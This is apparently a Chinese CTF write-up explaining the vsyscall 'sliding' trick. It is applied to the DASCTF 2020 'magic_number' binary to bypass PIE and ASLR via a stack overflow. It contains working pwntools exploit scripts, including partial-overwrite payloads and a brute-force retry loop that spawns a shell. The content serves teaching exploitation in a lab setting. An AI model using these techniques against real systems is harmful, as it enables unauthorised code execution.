> 链接: [https://pan.baidu.com/s/1fnfbW5CNyWU-eTxg6z8iRw](https://pan.baidu.com/s/1fnfbW5CNyWU-eTxg6z8iRw) 提取码: k128 
>
> --来自百度网盘超级会员v4的分享
>

# 前言
> 该题只有文章最后一个脚本在ubuntu16测试通过，其他脚本在ubuntu18中测试通过（ubuntu16未测试）
>

vsyscall滑动和爆破相当于做题的一个小技巧，主要是利用了程序加载后的vsyscall段中的指令：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628567389795-49add47c-b61b-4c61-a1fe-b1ed1214c975.png)

当然，这段指令仅在部分Linux发行版中拥有，如ubuntu16、ubuntu18等

# vsyscall的来源
为了系统的安全，Linux选择将用户态的数据和内核态的数据进行隔离，在进行系统调用时需要由用户态切换为内核态，这就需要在切换用户态时保存寄存器的上下文，执行完毕后再恢复原有的状态，这中间就会导致大量的系统开销；一般常见的系统调用syscall、int 0x80在调用时都需要向内核传递一些参数，更是增加了系统的开销。如何让系统开销变小是一个问题，因此Linux采用将经常使用的无参系统调用（如gettimeofday、time、get_cpu）从内核中映射到用户空间中的方式来减小开销，这就是上面那张图片中的vsyscall段。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628575400020-7f378947-9133-452b-8ea1-49f614a76ed8.png)

> 图来自SROP
>

# vsyscall内容
> 关闭ALSR：echo 0 > /proc/sys/kernel/randomize_va_space
>

使用gdb可以dump出vsyscall的内容：

```bash
dump memory ./dump_vsyscall 0xffffffffff600000 0xffffffffff601000
```

然后我们放到IDA中可以看下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628575127282-5e123541-0aac-4e11-bf40-b24f4f452524.png)

可以看到vsyscall中只有三段汇编代码：

```bash
seg000:0000000000000000                 mov     rax, 60h
seg000:0000000000000007                 syscall                 ; Low latency system call  //gettimeofday
seg000:0000000000000009                 retn
seg000:0000000000000009 ; ---------------------------------------------------------------------------
seg000:000000000000000A                 align 400h              //algin的内容全部都是0xCC即int 3的机器码
seg000:0000000000000400                 mov     rax, 0C9h
seg000:0000000000000407                 syscall                 ; Low latency system call  //time
seg000:0000000000000409                 retn
seg000:0000000000000409 ; ---------------------------------------------------------------------------
seg000:000000000000040A                 align 400h						  //algin的内容全部都是0xCC即int 3的机器码
seg000:0000000000000800                 mov     rax, 135h
seg000:0000000000000807                 syscall                 ; Low latency system call  //get_cpu
seg000:0000000000000809                 retn
seg000:0000000000000809 ; ---------------------------------------------------------------------------
seg000:000000000000080A                 align 800h              //algin的内容全部都是0xCC即int 3的机器码
```

这三段系统调用从上到下依次是gettimeofday、time、get_cpu。

# vsyscall滑动（No PIE）
> 关闭ALSR：echo 0 > /proc/sys/kernel/randomize_va_space
>

接下来看vsyscall在CTF-pwn中的作用，这里选用2020 DASCTF 8月赛的magic_number来举例（**关闭ALSR即程序的PIE不起作用**）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628575730877-97dba206-8dfb-415c-8056-1340496d90df.png)

程序很简单，生成一个随机数，然后与0x12345678进行比较，如果相等的话即可拿到shell：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628575841656-a86a266e-b2a0-4aa7-9a93-89245e99e64e.png)

另外，程序还有一个read栈溢出:

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
p=process("./magic_number")
p.recvuntil('Your Input :\n')
gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
p.send('a'*56)  #勿用sendline
p.interactive()
```

buf缓冲区填满之后的状况如下：

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      0x00007ffff7a03bf7
    									#返回地址
0x7fffffffe1f0: 0x0000000000000001      0x00007fffffffe2c8
0x7fffffffe200: 0x0000000100008000      0x0000555555554a80
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

这里先用普通的方法写一下：

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
p=process("./magic_number")
payload=56*'a'+p64(0x555555554AA8)  #4AA8
p.recvuntil('Your Input :\n')
#gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
p.sendline(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628577187562-07a0adda-ca0f-4203-b8b2-cbf236f930b0.png)

如下面代码框所示，我们是否可以利用栈上的地址将其进行变换来getshell？

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      0x00007ffff7a03bf7
    									#返回地址
0x7fffffffe1f0: 0x0000000000000001      0x00007fffffffe2c8
0x7fffffffe200: 0x0000000100008000      0x0000555555554a80
    									#main_start_addr
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

答案是肯定的，这就要利用到vsyscall中的gadget了；之前说过vsyscall一共有3段汇编代码，但是其中的syscall和mov指令都不重要，我们主要利用其中的ret指令，可以在栈溢出后将栈布置成这样：

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      &vsyscall
    									#返回地址
0x7fffffffe1f0: &vsyscall       		0x00007fffffffe2c8
                               #&system:0x0000555555554aa8
0x7fffffffe200: 0x0000000100008000      0x0000555555554a80
    						   
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

这里我们将返回地址改为了vsyscall，**ret（pop rip）后将从vsyscall的开头执行代码，因为vsyscall有ret，所以会再次重复执行vsyscall，直到执行system拿到shell（重复使用vsyscall其中一段代码即可）**，exp如下：

> vsyscall滑动：从vsyscall一路ret(滑动)到目标地址，相当于ROPgadget
>

```python
#coding=utf-8
from pwn import *
context.terminal = ['tmux','splitw','-h']
p=process("./magic_number")
vsyscall_start_addr=0xffffffffff600000
system_start_addr=0x0000555555554aa8
payload="a"*(0x38)+p64(vsyscall_start_addr)*2+p64(system_start_addr)
p.recvuntil('Your Input :\n')
#gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
p.send(payload)
p.interactive()
```

# ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628583654011-fe0cd91b-f7e9-4add-b204-37487051c9c2.png)vsyscall滑动（PIE）
相较于没有开PIE的情况而言，开了PIE的情况就有点稍微复杂了，为了方便说明在part1中仍关闭系统的ALSR，后续part中开启。

**在这里补充一下，vsyscall滑动的核心思想是利用了栈上的残留信息来bypass PIE。**

## Part1[ALSR 0]
地址随机化有一个致命的缺陷，在随机化之后地址的后12bit是不会发生变化的，所以我们可以覆盖一个和system“长的很像”（只有低8bit不同）的地址，将其低一位篡改为system，再使用vsyscall滑动的那里即可拿到shell。

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      0x00007ffff7a03bf7
    									#返回地址
0x7fffffffe1f0: 0x0000000000000001      0x00007fffffffe2c8
0x7fffffffe200: 0x0000000100008000      0x0000555555554a80
    									#main_start_addr（main起始地址）
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

考虑到main_start_addr（0x0000555555554a80）与system的地址（0x0000555555554a8）“长的很像”，溢出之后使用vsyscall指令滑到此处即可拿shell：

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      &vsyscall
    									#返回地址
0x7fffffffe1f0: &vsyscall               &vsyscall
0x7fffffffe200: &vsyscall		        0x00005555555554a8
    									#system
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

```python
#coding=utf-8
from pwn import *
context.terminal = ['tmux','splitw','-h']
p=process("./magic_number")
vsyscall_start_addr=0xffffffffff600000
payload="a"*0x38+p64(vsyscall_start_addr)*4+'\xa8'
p.recvuntil('Your Input :\n')
#gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
p.send(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628584795887-bf72a30a-4c74-42aa-8326-0897880aad94.png)

## Part2[ALSR 1 or 2]
> 开启ALSR：echo 1 > /proc/sys/kernel/randomize_va_space 或 echo 2 > /proc/sys/kernel/randomize_va_space
>
> ALSR的开启有两个等级：1或2，它们之间的区别将在下一篇文章中研究
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628585130953-da0f3ee8-d62d-44f3-8a0b-95405603b82d.png)

在此part中将开启ALSR，因为要使用vsyscall，所以这里的关注点在地址随机化之后vsyscall的变化情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628585681999-2b25c2c9-d785-4488-aa1d-0ca20e7d09eb.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628585732564-d14324ff-12d3-4015-a274-764c5ccc0f37.png)

可以看到，无论是在ALSR开启1等级或2等级时地址vsyscall的地址都不会发生变化，这与宏定义VSYSCALL_ADDR有关：

```c
#define VSYSCALL_ADDR (-10UL << 20)
#define VSYSCALL_ADDR_vgettimeofday  0xffffffffff600000
#define VSYSCALL_ADDR_vtime        0xffffffffff600400
#define VSYSCALL_ADDR_vgetcpu       0xffffffffff600800
```

所以还是可以使用part1中的exp来getshell：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628586751271-be2e9d98-4cbd-4d00-92e9-f8a33b4b9d0c.png)

## Part3[ALSR 1 or 2]
假如栈中没有和system“长的很像”的地址，只有低12bit不同的地址呢？这里使用0x7fffffffe220的0x0000555555554870来举例，仍然是开启ALSR。

```python
pwndbg> x/20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1c0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1d0: 0x6161616161616161      0x6161616161616161
0x7fffffffe1e0: 0x6161616161616161      0x00007ffff7a03bf7
    									#返回地址
0x7fffffffe1f0: 0x0000000000000001      0x00007fffffffe2c8
0x7fffffffe200: 0x0000000100008000      0x0000555555554a80
    									#main_start_addr（main起始地址）
0x7fffffffe210: 0x0000000000000000      0x3a60c97119fb3eba
0x7fffffffe220: 0x0000555555554870      0x00007fffffffe2c0
    		    #start函数起始地址
0x7fffffffe230: 0x0000000000000000      0x0000000000000000
0x7fffffffe240: 0x6f359c244ffb3eba      0x6f358c9bfb453eba
pwndbg> 
```

因为在覆盖地址时只能覆盖低16bit地址，所以可以在payload中写入固定的低16bit，然后使用爆破，这样getshell的几率就有1/16:

> 在爆破之前请先运行如下脚本看是否会崩溃（关ALSR），若崩溃的原因是xmm 16字节对齐，则爆破脚本无法getshell
>

```python
#coding=utf-8
from pwn import *
context.log_level="debug"
context.terminal = ['tmux','splitw','-h']

p=process("./magic_number")
vsyscall_start_addr=0xffffffffff600000
payload="a"*0x38+p64(vsyscall_start_addr)*7+'\xa8'+'\x4a'
p.recvuntil('Your Input :\n')
#gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
p.send(payload)
#p.recv(timeout=2)
p.interactive()
```

```python
#coding=utf-8
from pwn import *
context.log_level="debug"
context.terminal = ['tmux','splitw','-h']

def attack():
    global p
    p=process("./magic_number")
    vsyscall_start_addr=0xffffffffff600000
    payload="a"*0x38+p64(vsyscall_start_addr)*7+'\xa8'+'\x4a'
    p.recvuntil('Your Input :\n')
    #gdb.attach(proc.pidof(p)[0],gdbscript="b *$rebase(0xAE0)")
    p.send(payload)
    p.recv(timeout=2) #若程序崩溃则recv会崩溃，触发python异常
    p.interactive()

if __name__ == '__main__':
    time=1
    while True:
        try:
            log.info("No.%d try attack"%(time))
            attack()
        except EOFError:
            p.close()
            log.failure("EOFError")
            time = time + 1
            continue
        except KeyboardInterrupt:
            log.info("KeyboardInterrupt")
            break
```

> 若此脚本因xmm导致无法getshell，则请切换为ubuntu16
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628598213789-0a9d5c91-31c8-49d6-b87b-a37e632fbc09.png)

# 一点补充
vsyscall只能从每一段汇编指令的开头执行，这是因为vsyscall执行时会进行检查，若不是则会crash；因此我们唯一的选择就是return到0xffffffffff600000, 0xffffffffff600400, 0xffffffffff600800这三个地址。

# 后记
本来最后一个脚本因为xmm 16对齐的原因会崩溃想尝试尝试调整栈能否getshell，但是发现所有的路都因为PIE被堵死，遂放弃。

